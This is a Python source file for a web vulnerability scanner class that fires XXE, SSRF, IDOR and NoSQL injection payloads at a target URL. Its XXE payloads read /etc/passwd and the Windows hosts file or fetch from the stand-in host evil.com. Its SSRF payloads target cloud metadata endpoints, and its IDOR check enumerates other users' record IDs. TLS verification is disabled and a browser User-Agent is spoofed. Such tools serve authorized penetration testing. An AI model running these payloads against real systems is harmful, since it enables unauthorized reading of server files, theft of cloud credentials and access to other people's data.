
import requests
import re
import json
import base64
from urllib.parse import urljoin, urlparse
from colorama import Fore, Style
import xml.etree.ElementTree as ET

class Scanners:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 15
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
    
    def xxe_scanner(self, url, params=None):
        vulnerabilities = []
        xxe_payloads = [
            '''<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
            <root>&xxe;</root>''',
            '''<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]>
            <root>&xxe;</root>''',
            '''<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/test.txt">]>
            <root>&xxe;</root>''',
            '''<?xml version="1.0"?>
            <!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
            <root>&test;</root>'''
        ]
        
        print(f"{Fore.YELLOW}Scanning {url} for XXE vulnerabilities...{Style.RESET_ALL}")
        
        xxe_patterns = [
            r"root:.*:0:0:",
            r"daemon:.*:",
            r"# localhost",
            r"127\.0\.0\.1"
        ]
        
        for payload in xxe_payloads:
            try:
                headers = {'Content-Type': 'application/xml'}
                response = self.session.post(url, data=payload, headers=headers)
                
                for pattern in xxe_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        vuln = {
                            'type': 'XXE (XML External Entity)',
                            'url': url,
                            'payload': payload[:100] + '...',
                            'evidence': pattern
                        }
                        vulnerabilities.append(vuln)
                        print(f"{Fore.RED}XXE vulnerability found!{Style.RESET_ALL}")
                        break
            
            except Exception as e:
                continue
        
        return vulnerabilities
    
    def ssrf_scanner(self, url, params=None):
        vulnerabilities = []
        ssrf_payloads = [
            "http://127.0.0.1:80",
            "http://localhost:80",
            "http://0.0.0.0:80",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
            "gopher://127.0.0.1:80/",
            "dict://127.0.0.1:80/",
            "http://metadata.google.internal/computeMetadata/v1/"
        ]
        
        print(f"{Fore.YELLOW}Scanning {url} for SSRF vulnerabilities...{Style.RESET_ALL}")
        
        ssrf_patterns = [
            r"Connection refused",
            r"failed to open stream",
            r"timeout",
            r"ami-",
            r"instance-id",
            r"local-hostname"
        ]
        
        for payload in ssrf_payloads:
            try:
                if params:
                    for param in params:
                        test_params = params.copy()
                        test_params[param] = payload
                        
                        response = self.session.get(url, params=test_params)
                        
                        for pattern in ssrf_patterns:
                            if re.search(pattern, response.text, re.IGNORECASE):
                                vuln = {
                                    'type': 'SSRF (Server-Side Request Forgery)',
                                    'url': url,
                                    'parameter': param,
                                    'payload': payload,
                                    'evidence': pattern
                                }
                                vulnerabilities.append(vuln)
                                print(f"{Fore.RED}SSRF vulnerability found: {param} = {payload}{Style.RESET_ALL}")
                                break
            
            except Exception as e:
                continue
        
        return vulnerabilities
    
    def idor_scanner(self, url, params=None):
        vulnerabilities = []
        
        print(f"{Fore.YELLOW}Scanning {url} for IDOR vulnerabilities...{Style.RESET_ALL}")
        
        idor_patterns = [
            r"user_id=\d+",
            r"id=\d+",
            r"account=\d+",
            r"profile=\d+"
        ]
        
        test_ids = ['1', '2', '100', '999', '0', '-1']
        
        try:
            if params:
                for param in params:
                    if any(x in param.lower() for x in ['id', 'user', 'account', 'profile']):
                        original_response = requests.get(url, params=params, timeout=10)
                        
                        for test_id in test_ids:
                            test_params = params.copy()
                            test_params[param] = test_id
                            
                            test_response = requests.get(url, params=test_params, timeout=10)
                            
                            if (test_response.status_code == 200 and 
                                len(test_response.text) > 100 and
                                test_response.text != original_response.text):
                                
                                vuln = {
                                    'type': 'IDOR (Insecure Direct Object Reference)',
                                    'url': url,
                                    'parameter': param,
                                    'payload': test_id,
                                    'evidence': 'Different response for different IDs'
                                }
                                vulnerabilities.append(vuln)
                                print(f"{Fore.RED}IDOR vulnerability found: {param} = {test_id}{Style.RESET_ALL}")
                                break
        
        except Exception as e:
            pass
        
        return vulnerabilities
    
    def nosql_injection_scanner(self, url, params=None):
        vulnerabilities = []
        nosql_payloads = [
            "true, true",
            "', '1'=='1",
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$regex": ".*"}',
            "admin'||'1'=='1",
            '[$ne]=1',
            '[$regex]=.*',
            '[$where]=1',
            "1'; return true; var dummy='1"
        ]
        
        print(f"{Fore.YELLOW}Scanning {url} for NoSQL injection...{Style.RESET_ALL}")
        
        nosql_patterns = [
            r"MongoError",
            r"CouchDB",
            r"RethinkDB",
            r"CassandraError",
            r"neo4j",
            r"MongoDB",
            r"syntax error.*mongo"
        ]
        
        for payload in nosql_payloads:
            try:
                if params:
                    for param in params:
                        test_params = params.copy()
                        test_params[param] = payload
                        
                        response = self.session.get(url, params=test_params)
                        
                        for pattern in nosql_patterns:
                            if re.search(pattern, response.text, re.IGNORECASE):
                                vuln = {
                                    'type': 'NoSQL Injection',
                                    'url': url,
                                    'parameter': param,
                                    'payload': payload,
                                    'evidence': pattern
                                }
                                vulnerabilities.append(vuln)
                                print(f"{Fore.RED}NoSQL Injection found: {param} = {payload}{Style.RESET_ALL}")
                                break
            
            except Exception as e:
                continue
        
        return vulnerabilities
